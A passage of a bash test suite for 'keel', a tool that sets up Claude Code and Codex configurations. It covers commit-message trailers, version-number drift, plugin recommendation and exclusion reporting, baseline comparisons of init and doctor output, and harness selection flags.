( cd "$tv" && git add -A && git commit -q -m "a real commit" )
msg="$( cd "$tv" && git log -1 --format=%B )"
kv="$(sed -n 's/.*"keel_version": *"\([^"]*\)".*/\1/p' "$tv/.keel/profile.json" | head -1)"
case "$msg" in
  *"Keel-Version: $kv"*) ok "commit message carries the Keel-Version trailer" ;;
  *) bad "guard" "commit message has no 'Keel-Version: $kv' trailer. Got: $msg" ;;
esac

# amending does not duplicate the trailer. --no-edit, not -m: with -m git hands the hook a fresh
# message that has no trailer in it yet, so the duplicate guard is never reached and the assertion
# would pass against a hook with no guard at all. --no-edit feeds the previous message, trailer
# included, back through prepare-commit-msg, which is the case the guard exists for.
( cd "$tv" && git commit -q --amend --no-edit )
msg2="$( cd "$tv" && git log -1 --format=%B )"
count="$(printf '%s\n' "$msg2" | grep -c '^Keel-Version:')"
[ "$count" -eq 1 ] && ok "amending a commit does not duplicate the Keel-Version trailer" \
  || bad "guard" "expected exactly one Keel-Version trailer after amend, found $count"

# The hook body lives inside a quoted heredoc, so the repo's own lint reads it as a string and
# never parses it. Linting the generated file, the same pattern the existing pre-push and
# pre-commit shellcheck tests use, is the only way this code gets checked at all.
if command -v shellcheck >/dev/null 2>&1; then
    shellcheck -s bash "$tv/.githooks/prepare-commit-msg" >/dev/null 2>&1 \
      && ok "the generated prepare-commit-msg hook is shellcheck clean" \
      || bad "guard" "shellcheck flagged prepare-commit-msg: $(shellcheck -s bash "$tv/.githooks/prepare-commit-msg" 2>&1 | head -3)"
else
    printf '  SKIP  shellcheck is absent, so the generated prepare-commit-msg hook was not linted\n'
fi

( cd "$tv" && "$KEEL" guard uninstall >/dev/null 2>&1 )
[ ! -e "$tv/.githooks/prepare-commit-msg" ] && ok "guard uninstall removes the prepare-commit-msg hook too" \
  || bad "guard" "prepare-commit-msg survived uninstall"
rm -rf "$tv"

# ---- the two version numbers ----------------------------------------------
# VERSION drives the CLI and the value recorded in every project's profile. The version in
# .claude-plugin/plugin.json is what keys the installed plugin cache, so it is the one that decides
# whether an install picks a change up at all.
#
# They drifted once, silently: VERSION reached 0.3.0 with a whole feature behind it while
# plugin.json still said 0.2.0. Nothing failed. `keel version` was right, the CHANGELOG was right,
# and every install stayed on the previous skills, because the cache had already seen 0.2.0 and had
# no reason to fetch again. The symptom is a skill fix that reaches nobody and cannot be reproduced
# by its author, whose working tree is correct.
cli_version="$(cat "$ROOT/VERSION")"
# Every plugin manifest in the tree, not just Claude Code's. There are two since 2026-09-06, and a
# second one carrying a version is a second thing to drift: Codex keys its plugin cache the same
# way, so a Codex user would sit on the previous skills with nothing failing. Globbed rather than
# listed, so the third manifest is covered on the day it is added rather than the day it drifts.
for m in "$ROOT"/.*-plugin/plugin.json; do
    [ -f "$m" ] || continue
    plugin_version="$(sed -n 's/.*"version": "\(.*\)".*/\1/p' "$m" | head -1)"
    [ "$cli_version" = "$plugin_version" ] \
      && ok "VERSION and $(basename "$(dirname "$m")")/plugin.json agree ($cli_version)" \
      || bad "version drift" "VERSION is $cli_version, $(basename "$(dirname "$m")")/plugin.json is $plugin_version. The plugin cache is keyed on plugin.json, so installs stay on $plugin_version"
done

# The CHANGELOG's newest heading is the third copy of the number, and the one a human reads.
changelog_version="$(sed -n 's/^## \([0-9][0-9.]*\).*/\1/p' "$ROOT/CHANGELOG.md" | head -1)"
[ "$cli_version" = "$changelog_version" ] \
  && ok "CHANGELOG's newest entry matches VERSION ($cli_version)" \
  || bad "version drift" "VERSION is $cli_version, newest CHANGELOG entry is $changelog_version"

# The reference says which keys keel writes and which a human adds. That column is derived from a
# real init when the page is generated, and this is what stops it drifting afterwards. A
# hand-maintained list said twelve human-only keys until the context window work moved one, and
# nothing would have noticed.
c="$(fixture node-ts)"
( cd "$c" && "$KEEL" init -y >/dev/null 2>&1 )
drift="$(PAGE="$ROOT/docs/profile-keys.md" PROFILE="$c/.keel/profile.json" python3 -c "
import json, os, re
page = open(os.environ['PAGE']).read()
claimed = {}
for k, setby in re.findall(r'^\| \`([^\`]+)\` \| [^|]* \| ([^|]*) \|', page, re.M):
    claimed[k] = 'init' in setby
def leaves(o, p=''):
    s = set()
    if isinstance(o, dict):
        for k, v in o.items(): s |= leaves(v, f'{p}.{k}' if p else k)
    else: s.add(p)
    return s
actual = leaves(json.load(open(os.environ['PROFILE'])))
print(' '.join(sorted(k for k, says in claimed.items() if says != (k in actual))))
")"
[ -z "$drift" ] && ok "the reference's set-by column matches what keel init writes" \
  || bad "profile-keys" "the column disagrees with a real init for: $drift. Regenerate with tests/generate-profile-keys.sh"
rm -rf "$c"

# doctor has always been able to report a missing recommended plugin; it had nothing to check
# against. plugin_report reads plugins.recommended and falls back to a fixed three when it is
# absent, and init never wrote it, so no language server was ever named.
pr="$(fixture node-ts)"
( cd "$pr" && "$KEEL" init -y >/dev/null 2>&1 )
python3 -c "
import json,sys
r=json.load(open('$pr/.keel/profile.json')).get('plugins',{}).get('recommended') or []
sys.exit(0 if 'typescript-lsp@claude-plugins-official' in r else 1)" \
  && ok "init records the language server for the detected stack" \
  || bad "plugins" "plugins.recommended does not name typescript-lsp"
rm -rf "$pr"

pg="$(fixture go)"
( cd "$pg" && "$KEEL" init -y >/dev/null 2>&1 )
python3 -c "
import json,sys
r=json.load(open('$pg/.keel/profile.json')).get('plugins',{}).get('recommended') or []
sys.exit(0 if 'gopls-lsp@claude-plugins-official' in r else 1)" \
  && ok "a go project records gopls-lsp" \
  || bad "plugins" "plugins.recommended does not name gopls-lsp"
rm -rf "$pg"

# The case this whole half exists for. A repository that already has .claude/settings.json takes
# the merge path, which touches permissions and nothing else, so no plugin is enabled: not the
# language server, not keel@gbi. Until init wrote plugins.recommended, doctor could not see it.
pm="$(fixture node-ts)"
mkdir -p "$pm/.claude"
printf '{\n  "permissions": { "allow": ["Bash(ls:*)"] }\n}\n' > "$pm/.claude/settings.json"
( cd "$pm" && "$KEEL" init -y >/dev/null 2>&1 )
# CLAUDE_CONFIG_DIR points at an empty directory so nothing is enabled at user scope. Without it
# this depends on the machine: a developer whose keel is enabled at user scope, which is how it is
# normally installed, would see doctor correctly stay quiet about keel@gbi and the assertion would
# fail for them and pass for everyone else.
mkdir -p "$pm/emptyconf"
out="$( cd "$pm" && CLAUDE_CONFIG_DIR="$pm/emptyconf" HOME="$pm" "$KEEL" doctor 2>&1 )"
case "$out" in *typescript-lsp*) ok "doctor names the missing language server on a mature repo" ;;
  *) bad "plugins" "doctor did not name typescript-lsp as missing" ;; esac
case "$out" in *keel@gbi*) ok "doctor names keel@gbi as not enabled when it is enabled nowhere" ;;
  *) bad "plugins" "doctor did not name keel@gbi as missing" ;; esac
case "$out" in *"/plugin install"*) ok "doctor names the command that installs it" ;;
  *) bad "plugins" "doctor reported a missing plugin without saying how to install it" ;; esac
rm -rf "$pm"

# A fresh repository has them enabled already, so it must stay quiet. A warning that fires on a
# healthy project is one people learn to scroll past.
pf="$(fixture node-ts)"
( cd "$pf" && "$KEEL" init -y >/dev/null 2>&1 )
out="$( cd "$pf" && "$KEEL" doctor 2>&1 )"
case "$out" in *"recommended plugin not enabled"*) bad "plugins" "doctor warned on a fresh repo where init enabled everything" ;;
  *) ok "a fresh repository is not warned about plugins" ;; esac
rm -rf "$pf"

# Two deliberate non-behaviours, which are the kind most easily lost to a later helpful change.
ps="$(fixture node-ts)"
mkdir -p "$ps/.claude"
printf '{\n  "permissions": { "allow": ["Bash(ls:*)"] }\n}\n' > "$ps/.claude/settings.json"
( cd "$ps" && "$KEEL" init -y >/dev/null 2>&1 )
python3 -c "
import json,sys
s=json.load(open('$ps/.claude/settings.json'))
sys.exit(0 if 'enabledPlugins' not in s else 1)" \
  && ok "init adds no plugin entries to an existing settings file" \
  || bad "settings" "init wrote enabledPlugins into a file the project already had"

# The same path must still add the guardrails, which is the one thing it is for.
python3 -c "
import json,sys
p=json.load(open('$ps/.claude/settings.json')).get('permissions',{})
sys.exit(0 if p.get('deny') else 1)" \
  && ok "init still merges the permission guardrails into an existing settings file" \
  || bad "settings" "the permission merge stopped happening"

# A curated plugins.recommended is a human value and merge_profile must keep it.
python3 - "$ps" <<'PY5'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d["plugins"]["recommended"]=["context7@claude-plugins-official"]
p.write_text(json.dumps(d,indent=2)+"\n")
PY5
( cd "$ps" && "$KEEL" init -y >/dev/null 2>&1 )
python3 -c "
import json,sys
r=json.load(open('$ps/.keel/profile.json'))['plugins']['recommended']
sys.exit(0 if r==['context7@claude-plugins-official'] else 1)" \
  && ok "a hand-edited plugins.recommended survives re-initialisation" \
  || bad "plugins" "re-init overwrote a curated plugin list"
rm -rf "$ps"

# A plugin enabled at user scope is enabled. plugin_report read only the project settings file,
# which was harmless while its fallback list was three plugins nobody enables per project. Once init
# wrote keel@gbi into plugins.recommended, every project whose keel is enabled at user scope, which
# is how it is normally installed, got a permanent warning that it was missing, alongside doctor's
# own line saying the marketplace is registered. The remedy it printed did not help either:
# /plugin install writes user scope, which is the scope this never read.
pu="$(fixture node-ts)"
mkdir -p "$pu/.claude" "$pu/userconf"
printf '{\n  "permissions": { "allow": ["Bash(ls:*)"] }\n}\n' > "$pu/.claude/settings.json"
printf '{ "enabledPlugins": { "keel@gbi": true } }\n' > "$pu/userconf/settings.json"
( cd "$pu" && "$KEEL" init -y >/dev/null 2>&1 )
out="$( cd "$pu" && CLAUDE_CONFIG_DIR="$pu/userconf" HOME="$pu" "$KEEL" doctor 2>&1 )"
case "$out" in *"not enabled: keel@gbi"*) bad "plugin scope" "doctor called keel@gbi missing while it is enabled at user scope" ;;
  *) ok "a plugin enabled at user scope is not reported missing" ;; esac
# And one that really is missing everywhere is still reported, so the fix does not silence the check.
case "$out" in *"not enabled: typescript-lsp"*) ok "a plugin missing from every scope is still reported" ;;
  *) bad "plugin scope" "the scope fix silenced a genuinely missing plugin" ;; esac
rm -rf "$pu"

# plugins.excluded was declared so a project had somewhere to record the decision, and nothing
# honoured it, so a plugin a team had deliberately rejected was recommended to them on every
# doctor run. The recommended list wins nothing here: excluded is the later decision.
#
# THE FIXTURE HAS TO TAKE THE MERGE PATH. On a fresh node-ts fixture `keel init` writes
# .claude/settings.json with typescript-lsp and the rest already enabled, so plugin_report has
# nothing to report and both cases below would pass while asserting nothing. Writing a settings
# file first takes the merge path, which touches permissions only and enables no plugin, which is
# what the existing `pm` merge-path case in this file already exists to set up.
#
# CLAUDE_CONFIG_DIR and HOME are not optional. The `pu` user-scope case in this file records why: a
# developer whose plugins are enabled at user scope, which is how keel is normally installed,
# would see doctor correctly stay quiet and the assertion would fail for them alone.
px="$(fixture node-ts)"
mkdir -p "$px/.claude" "$px/emptyconf"
printf '{\n  "permissions": { "allow": ["Bash(ls:*)"] }\n}\n' > "$px/.claude/settings.json"
( cd "$px" && "$KEEL" init -y >/dev/null 2>&1 )
( cd "$px" && python3 - <<'PY'
import json
p = ".keel/profile.json"
d = json.load(open(p))
d["plugins"] = {"recommended": ["context7@claude-plugins-official",
                                "claude-md-management@claude-plugins-official"],
                "excluded": ["context7@claude-plugins-official"]}
json.dump(d, open(p, "w"), indent=2)
PY
)
out="$( cd "$px" && CLAUDE_CONFIG_DIR="$px/emptyconf" HOME="$px" "$KEEL" doctor 2>&1 )"
case "$out" in *context7@claude-plugins-official*)
    bad "an excluded plugin is not recommended" "$out" ;;
  *) ok "an excluded plugin is not recommended" ;;
esac
# The floor for this pair. Without it, a plugin_report that reported nothing at all would pass the
# case above, and reporting nothing is exactly what a broken settings read looks like.
#
# The companion is claude-md-management and NOT code-review, deliberately. code-review is one of
# the three hardcoded names the fallback list carries, so it is reported even when the profile read
# throws and the fallback substitutes: the assertion would pass while proving nothing about the
# project's own list. That matters more since excluded parsing moved inside the same try. Any name
# in expected_plugins that is not one of security-guidance, code-review or skill-creator works.
case "$out" in *claude-md-management@claude-plugins-official*)
    ok "a recommended plugin beside it is still reported" ;;
  *) bad "a recommended plugin beside it is still reported" "$out" ;;
esac

( cd "$px" && python3 - <<'PY'
import json
p = ".keel/profile.json"
d = json.load(open(p))
d["plugins"]["excluded"] = []
json.dump(d, open(p, "w"), indent=2)
PY
)
out="$( cd "$px" && CLAUDE_CONFIG_DIR="$px/emptyconf" HOME="$px" "$KEEL" doctor 2>&1 )"
case "$out" in *context7@claude-plugins-official*)
    ok "the same plugin is reported when the exclusion is removed" ;;
  *) bad "the same plugin is reported when the exclusion is removed" "$out" ;;
esac

# The ordering case, and it is the only one that fails if the subtraction moves ahead of the
# fallback. Every case above excludes one of two recommended plugins, so `rec` never empties and
# the ordering is never exercised: a review proved by mutation that moving the subtraction before
# the fallback survives all three. Here the project excludes everything it recommends, so a
# subtraction that ran first would empty `rec`, hit `if not rec`, and hand back the hardcoded
# three, which is the exact opposite of what the project asked for.
( cd "$px" && python3 - <<'PY'
import json
p = ".keel/profile.json"
d = json.load(open(p))
d["plugins"] = {"recommended": ["context7@claude-plugins-official"],
                "excluded": ["context7@claude-plugins-official"]}
json.dump(d, open(p, "w"), indent=2)
PY
)
out="$( cd "$px" && CLAUDE_CONFIG_DIR="$px/emptyconf" HOME="$px" "$KEEL" doctor 2>&1 )"
case "$out" in
  *security-guidance@claude-plugins-official*|*skill-creator@claude-plugins-official*)
    bad "excluding every recommended plugin does not resurrect the fallback list" "$out" ;;
  *) ok "excluding every recommended plugin does not resurrect the fallback list" ;;
esac

# keel itself is not excludable, and this pins it. Every other plugin warning says a skill degrades
# to an inline fallback; the keel@ branch says no keel skill loads at all, which is not the same
# kind of advice. A project that listed keel@gbi under excluded would otherwise switch off the one
# warning here that is not about degradation. Decided by Bernard on 2026-09-08.
( cd "$px" && python3 - <<'PY'
import json
p = ".keel/profile.json"
d = json.load(open(p))
d["plugins"] = {"recommended": ["keel@gbi"], "excluded": ["keel@gbi"]}
json.dump(d, open(p, "w"), indent=2)
PY
)
out="$( cd "$px" && CLAUDE_CONFIG_DIR="$px/emptyconf" HOME="$px" "$KEEL" doctor 2>&1 )"
case "$out" in *"keel itself is not enabled here"*)
    ok "excluding keel@gbi does not silence the warning that keel is not loaded" ;;
  *) bad "excluding keel@gbi does not silence the warning that keel is not loaded" "$out" ;;
esac

# The type guard, which is the one property the implementation states in prose and nothing else
# pins. A review ran five mutations against the five cases above and every one died; a sixth,
# computing exc as set(_x or []) back inside the try, survived all of them. With a non-list
# excluded that mutation raises a TypeError into an except sized for "the profile does not load",
# discards the recommended list this project wrote, and reports against the hardcoded three
# instead. Asserting security-guidance is ABSENT is what catches it: that name can only appear via
# the fallback, never via the list set here.
( cd "$px" && python3 - <<'PY'
import json
p = ".keel/profile.json"
d = json.load(open(p))
d["plugins"] = {"recommended": ["context7@claude-plugins-official",
                                "claude-md-management@claude-plugins-official"],
                "excluded": 5}
json.dump(d, open(p, "w"), indent=2)
PY
)
out="$( cd "$px" && CLAUDE_CONFIG_DIR="$px/emptyconf" HOME="$px" "$KEEL" doctor 2>&1 )"
# Three arms, and the third is not decoration. Asserting only that the fallback name is absent
# passes vacuously when the whole block dies and doctor prints no plugin line at all, which is one
# of the two failure modes a malformed excluded can cause. A mutation proved that; the case has to
# see the list this project wrote, not merely fail to see the hardcoded one.
case "$out" in
  *security-guidance@claude-plugins-official*)
    bad "a malformed excluded is ignored, not treated as a failed profile read" "$out" ;;
  *claude-md-management@claude-plugins-official*)
    ok "a malformed excluded is ignored, not treated as a failed profile read" ;;
  *) bad "a malformed excluded is ignored, not treated as a failed profile read" "$out" ;;
esac

# The element check, which is a failure this change would otherwise introduce rather than inherit.
# A non-string element raises out of set() past the whole block, so SETTINGS_REPORT comes back
# empty and the conflict and duplicate reports die with this one. Before this change nothing read
# excluded, so the same profile was harmless. Asserting a recommended plugin IS still named is what
# catches it, because the symptom is silence rather than a wrong line.
( cd "$px" && python3 - <<'PY'
import json
p = ".keel/profile.json"
d = json.load(open(p))
d["plugins"] = {"recommended": ["claude-md-management@claude-plugins-official"],
                "excluded": [{"name": "context7@claude-plugins-official"}]}
json.dump(d, open(p, "w"), indent=2)
PY
)
out="$( cd "$px" && CLAUDE_CONFIG_DIR="$px/emptyconf" HOME="$px" "$KEEL" doctor 2>&1 )"
case "$out" in *claude-md-management@claude-plugins-official*)
    ok "a non-string element in excluded does not silence the whole plugin report" ;;
  *) bad "a non-string element in excluded does not silence the whole plugin report" "$out" ;;
esac

# recommended gets the same treatment, and this case is why the check covers both fields. A string
# is truthy, so it skips the fallback and the loop walks it character by character: a recommended
# of "abc" produced three warnings naming plugins a, b and c, each with an install command for a
# plugin that cannot exist. Measured 2026-09-08. An int raised instead and killed every report.
( cd "$px" && python3 - <<'PY'
import json
p = ".keel/profile.json"
d = json.load(open(p))
d["plugins"] = {"recommended": "context7@claude-plugins-official", "excluded": []}
json.dump(d, open(p, "w"), indent=2)
PY
)
out="$( cd "$px" && CLAUDE_CONFIG_DIR="$px/emptyconf" HOME="$px" "$KEEL" doctor 2>&1 )"
case "$out" in *"not enabled: c."*|*"not enabled: o."*|*"not enabled: n."*)
    bad "a string recommended is not walked character by character" "$out" ;;
  *) ok "a string recommended is not walked character by character" ;;
esac
rm -rf "$px"

rm -rf "$FIXTURE_CACHE"

# ---- the harness contract --------------------------------------------------
#
# R-01. The refactor may not change one byte of what a Claude Code user gets.
#
# The baseline is GENERATED from the pre-refactor commit, not committed as a fixture. Lines 1 to 3
# of this file state the policy the suite runs on: fixtures are generated per case rather than
# committed, so they cannot go stale against the code they exercise. A committed baseline of init
# output is exactly the fixture that policy forbids.
#
# KEEL_BASELINE_REF names the commit to compare against. Unset, it defaults to HEAD, which makes
# this a no-op comparison of the tree against itself: green, and proving nothing. That is why the
# refactor's hand-over records the SHA, and why this prints which ref it used rather than leaving a
# reader to guess whether the case meant anything.
BASELINE_REF="${KEEL_BASELINE_REF:-HEAD}"
base="$(mktemp -d)"; after="$(mktemp -d)"
if git -C "$ROOT" worktree add -q --detach "$base/repo" "$BASELINE_REF" 2>/dev/null; then
    ( cd "$base" && git init -q -b main . && "$base/repo/bin/keel" init -y > "$base/init.txt" 2>&1 )
    ( cd "$after" && git init -q -b main . && "$ROOT/bin/keel" init -y > "$after/init.txt" 2>&1 )
    # init's own stdout is compared too, with the fixture's directory name normalised out: that is
    # the only line that legitimately differs between two runs in two temp directories. Without it
    # the summary block is uncovered, and the refactor changed "CLAUDE.md, AGENTS.md" to
    # "CLAUDE.md AGENTS.md" with nothing noticing. Found in review of this task's own work.
    sed -E 's/configured .*/configured FIXTURE/' "$base/init.txt" > "$base/init.norm"
    sed -E 's/configured .*/configured FIXTURE/' "$after/init.txt" > "$after/init.norm"
    if diff -q "$base/init.norm" "$after/init.norm" >/dev/null 2>&1; then
        ok "init output unchanged against $BASELINE_REF: what it prints"
    else
        bad "init output unchanged against $BASELINE_REF: what it prints" \
          "$(diff "$base/init.norm" "$after/init.norm" 2>&1 | head -4 | tr '\n' ' ')"
    fi

    for f in .claude/settings.json .claude/settings.local.json CLAUDE.md AGENTS.md; do
        if diff -q "$base/$f" "$after/$f" >/dev/null 2>&1; then
            ok "init output unchanged against $BASELINE_REF: $f"
        else
            bad "init output unchanged against $BASELINE_REF: $f" \
              "$(diff "$base/$f" "$after/$f" 2>&1 | head -3 | tr '\n' ' ')"
        fi
    done

    # Doctor too, and this is the half the task's own step 1 leaves uncovered. The writers are one
    # part of the refactor; the other is that cmd_doctor's Claude Code checks move behind
    # harness_doctor_findings, and nothing above would notice those changing what a person reads.
    # Doctor's output is deterministic run to run in a fixture, checked before this was written.
    #
    # The schema version NUMBER is normalised out of both sides, and only the number. Task 8 bumps
    # SCHEMA_VERSION to 3 on purpose, so that one line differs from every pre-task-8 baseline for
    # the rest of the project's life, and a comparison that failed on it would be switched off
    # within a week. The line's wording and its level are still compared, and the number itself has
    # its own assertion further down, where a bump is the thing being tested rather than noise.
    #
    # The harness section is dropped from BOTH sides, and only that section. It is output the
    # refactor did not move: it did not exist until the doctor task added it, so a comparison that
    # included it would be red for the whole of that task and green again the moment it was
    # committed, which is a comparison that reports when somebody last committed rather than what
    # changed. Every line the filter drops carries its own assertion in this file. The alternatives
    # are anchored and name one line each, because a pattern loose enough to swallow a neighbouring
    # check would silence exactly what this comparison exists to catch.
    #
    # The closing tally goes with it, for the same reason and no other: it is the sum of the lines
    # above, so filtering a section out of the comparison and leaving its contribution in the total
    # would fail on arithmetic that is correct. That total has its own case, "doctor's summary
    # counts its warnings", which counts the WARN lines and compares.
    HSECTION='^(ok    running under |WARN  cannot determine which harness is running|ok    [a-z]+ gates active:|WARN  [a-z]+ will run none of keel|WARN  [a-z]+ gates the manifest grants:|WARN  [a-z]+ does not get |WARN  this repository declares hard_block_paths|WARN  codex is installed on this machine|keel doctor: )'
    ( cd "$base" && "$base/repo/bin/keel" doctor 2>&1 \
        | sed -E 's/schema version [0-9]+/schema version N/g' | grep -vE "$HSECTION" > "$base/doctor.txt" )
    ( cd "$after" && "$ROOT/bin/keel" doctor 2>&1 \
        | sed -E 's/schema version [0-9]+/schema version N/g' | grep -vE "$HSECTION" > "$after/doctor.txt" )
    if diff -q "$base/doctor.txt" "$after/doctor.txt" >/dev/null 2>&1; then
        ok "doctor output unchanged against $BASELINE_REF"
    else
        bad "doctor output unchanged against $BASELINE_REF" \
          "$(diff "$base/doctor.txt" "$after/doctor.txt" 2>&1 | head -4 | tr '\n' ' ')"
    fi
    git -C "$ROOT" worktree remove --force "$base/repo" 2>/dev/null
else
    bad "a baseline worktree at $BASELINE_REF" "git worktree add failed; the R-01 comparison did not run"
fi
rm -rf "$base" "$after"

# The neutral code names no harness OUTSIDE A COMMENT.
#
# `grep -n ... | grep -v '^ *#'` does not do that: grep -n prefixes every line with NNN:, so the
# comment filter matches nothing and the check demands bin/keel stop mentioning .claude even in
# prose. Measured: 50 hits before that filter and 50 after. Strip the prefix before filtering.
leak="$(grep -nE '\.claude|CLAUDE\.md|enabledPlugins|known_marketplaces' "$KEEL" \
        | sed 's/^[0-9]*://' | grep -vE '^[[:space:]]*#' | head -3)"
[ -z "$leak" ] && ok "bin/keel names no harness outside lib/harness/ and its comments" \
  || bad "bin/keel names no harness outside lib/harness/ and its comments" "$leak"

# The contract is complete, and it is checked by name rather than by whether init happened to work.
# A harness file missing one function fails at the call site, in a message about an undefined
# command, on somebody's machine. Here it is a red build with the function's name in it.
for fn in harness_write_config harness_write_local_config harness_permission_rules \
          harness_recommend_plugins harness_config_paths harness_doctor_findings; do
    grep -qE "^${fn}\(\)" "$ROOT/lib/harness/claude.sh" 2>/dev/null \
      && ok "claude.sh implements $fn" || bad "claude.sh implements $fn" "not defined"
done

# ---- which harnesses a repository serves ------------------------------------

h_case() {  # h_case <setup command> <init flag> <expected harnesses json>
    local setup="$1" flag="$2" want="$3" w got
    # $flag is deliberately split: it is empty in most cases and "--harness codex" in others.
    # Quoting it would pass one empty argument or one two-word one, and both break init.
    w="$(mktemp -d)"
    # A repository-local git identity, because two of the setups below commit. Without one, a
    # machine with no global user.name fails the commit, the `&&` chain aborts before `keel init`
    # runs, and the case reports an empty `got` for a profile that was never written. That is how
    # CI went red on 2026-09-07 on cases every laptop passed: the blank value was a missing file,
    # not a wrong answer. tests/run-tests.sh removes the ambient identity so this cannot recur
    # unseen.
    # shellcheck disable=SC2086
    ( cd "$w" && git init -q -b main . && git config user.email t@t.t && git config user.name t \
        && eval "$setup" \
        && "$ROOT/bin/keel" init $flag -y >/dev/null 2>&1 )
    got="$(python3 -c 'import json,sys;print(json.dumps(json.load(open(sys.argv[1])).get("harnesses")))' "$w/.keel/profile.json" 2>/dev/null)"
    [ "$got" = "$want" ] && ok "harnesses $want ($setup $flag)" \
      || bad "harnesses $want ($setup $flag)" "got $got"
    rm -rf "$w"
}

h_case "true"                                             ""                       '["claude"]'
h_case "true"                                             "--harness codex"        '["codex"]'
h_case "true"                                             "--harness claude,codex" '["claude", "codex"]'
h_case "mkdir -p .codex && echo x > .codex/config.toml && git add -A && git commit -qm x" "" '["claude", "codex"]'
h_case "mkdir -p .codex && echo x > .codex/config.toml"    ""                      '["claude"]'
h_case "echo x > AGENTS.md && git add -A && git commit -qm x" ""                   '["claude"]'

# Upgrading an existing schema 2 profile must not infer a harness from anything. An installed base
# that has been dual writing AGENTS.md since long before Codex was supported would otherwise be
# marked Codex-serving in one upgrade, and every one of those repositories would start claiming a
# tier nobody chose for it.
w="$(mktemp -d)"
( cd "$w" && git init -q -b main . && "$ROOT/bin/keel" init -y >/dev/null 2>&1 )
python3 - "$w/.keel/profile.json" <<'DOWNGRADE'
import json,sys
p=sys.argv[1]; d=json.load(open(p)); d["schema_version"]=2; d.pop("harnesses",None)
json.dump(d, open(p,"w"), indent=2)
DOWNGRADE
( cd "$w" && "$ROOT/bin/keel" init -y >/dev/null 2>&1 )
got="$(python3 -c 'import json,sys;d=json.load(open(sys.argv[1]));print(d.get("schema_version"), json.dumps(d.get("harnesses")))' "$w/.keel/profile.json")"
[ "$got" = '4 ["claude"]' ] && ok "a schema 2 profile upgrades to claude only" \
  || bad "a schema 2 profile upgrades to claude only" "got $got"
rm -rf "$w"

# An explicit --harness must win on a repository that ALREADY has a profile, and until this was
# found in review it silently lost. merge_profile defends every human value in the profile, which is
# right for a set somebody edited by hand and wrong for the flag that exists to change it: the only
# ways to move the set were --force, which discards every human value in the file, and hand-editing.
w="$(mktemp -d)"
( cd "$w" && git init -q -b main . && "$ROOT/bin/keel" init -y >/dev/null 2>&1 \
    && "$ROOT/bin/keel" init --harness codex -y >/dev/null 2>&1 )
got="$(python3 -c 'import json,sys;print(json.dumps(json.load(open(sys.argv[1])).get("harnesses")))' "$w/.keel/profile.json" 2>/dev/null)"
[ "$got" = '["codex"]' ] && ok "--harness wins over an existing profile" \
  || bad "--harness wins over an existing profile" "got $got"

# ...and a plain re-init does NOT re-infer it, which is the behaviour the merge is there to protect.
( cd "$w" && "$ROOT/bin/keel" init -y >/dev/null 2>&1 )
got="$(python3 -c 'import json,sys;print(json.dumps(json.load(open(sys.argv[1])).get("harnesses")))' "$w/.keel/profile.json" 2>/dev/null)"
[ "$got" = '["codex"]' ] && ok "a plain re-init leaves the harness set alone" \
  || bad "a plain re-init leaves the harness set alone" "got $got"
rm -rf "$w"

# --harness takes a value, and an unvalidated one ate the next flag: the profile recorded a harness
# called "--team", --team never ran, nothing was staged, and init reported success.
w="$(mktemp -d)"
( cd "$w" && git init -q -b main . && "$ROOT/bin/keel" init --harness --team -y >/dev/null 2>&1 )
[ -f "$w/.keel/profile.json" ] && bad "--harness refuses to swallow the next flag" "init wrote a profile" \
  || ok "--harness refuses to swallow the next flag"
rm -rf "$w"

w="$(mktemp -d)"
( cd "$w" && git init -q -b main . && "$ROOT/bin/keel" init --harness bogus -y >/dev/null 2>&1 )
[ -f "$w/.keel/profile.json" ] && bad "an unknown harness id is refused" "init wrote a profile" \
  || ok "an unknown harness id is refused"
rm -rf "$w"

# R-01: init still prompts for nothing.
w="$(mktemp -d)"
if ( cd "$w" && git init -q -b main . && "$ROOT/bin/keel" init -y </dev/null >/dev/null 2>&1 ); then
    ok "init completes with no tty and no prompt"
else
    bad "init completes with no tty and no prompt" "non-zero exit"
fi
rm -rf "$w"

# ---- a repository that serves Codex -----------------------------------------

w="$(mktemp -d)"; ( cd "$w" && git init -q -b main . && "$ROOT/bin/keel" init --harness codex -y >"$w/init.txt" 2>&1 )

[ -f "$w/.codex/config.toml" ] && ok "codex config written" || bad "codex config written" "absent"
[ -f "$w/.claude/settings.json" ] && bad "no Claude settings for a codex-only repo" "written" \
  || ok "no Claude settings for a codex-only repo"
grep -q 'keel:start' "$w/AGENTS.md" 2>/dev/null && ok "AGENTS.md carries the managed block" \
  || bad "AGENTS.md carries the managed block" "absent"
[ -f "$w/CLAUDE.md" ] && bad "no CLAUDE.md for a codex-only repo" "written" \
  || ok "no CLAUDE.md for a codex-only repo"

# The five path denies port and get stronger. A path deny also stops `cat`.
n="$(grep -c 'deny' "$w/.codex/config.toml" 2>/dev/null || echo 0)"
[ "$n" -ge 5 ] && ok "path denies written ($n)" || bad "path denies written" "got $n, wanted at least 5"

# Codex has no command-pattern rule syntax and no ask. Neither may be faked. A rule that looks like
# a prompt and is not one is the failure this whole design exists to prevent.
grep -qE 'Bash\(|"ask"|prompt' "$w/.codex/config.toml" 2>/dev/null \
  && bad "no command-pattern or ask rule is faked" "$(grep -nE 'Bash\(|"ask"|prompt' "$w/.codex/config.toml" | head -1)" \
  || ok "no command-pattern or ask rule is faked"

# Open question 6 of the architecture. Codex runs no hook until its source is trusted and says
# nothing when it skips one, so an install that says nothing leaves every gate silently dark. keel
# cannot grant that trust: it lives in the user's own config, not in this repository. What it can do
# is say so, and a message nothing pins is a message the next refactor deletes.
grep -qi 'trust' "$w/init.txt" 2>/dev/null && ok "init tells a Codex user about the hook trust step" \
  || bad "init tells a Codex user about the hook trust step" "no mention of trust in the init output"
grep -q 'dangerously-bypass-hook-trust' "$w/init.txt" 2>/dev/null \
  && bad "the bypass flag is not offered to a user" "init output names it" \
  || ok "the bypass flag is not offered to a user"
rm -rf "$w"

# A repository serving BOTH gets both, and this is the case a "last harness sourced wins" design
# passes for one harness and silently fails for the other.
w="$(mktemp -d)"; ( cd "$w" && git init -q -b main . && "$ROOT/bin/keel" init --harness claude,codex -y >/dev/null 2>&1 )
if [ -f "$w/.codex/config.toml" ] && [ -f "$w/.claude/settings.json" ] \
   && [ -f "$w/CLAUDE.md" ] && [ -f "$w/AGENTS.md" ]; then
    ok "a repository serving both harnesses gets both configurations"
else
    bad "a repository serving both harnesses gets both configurations" \
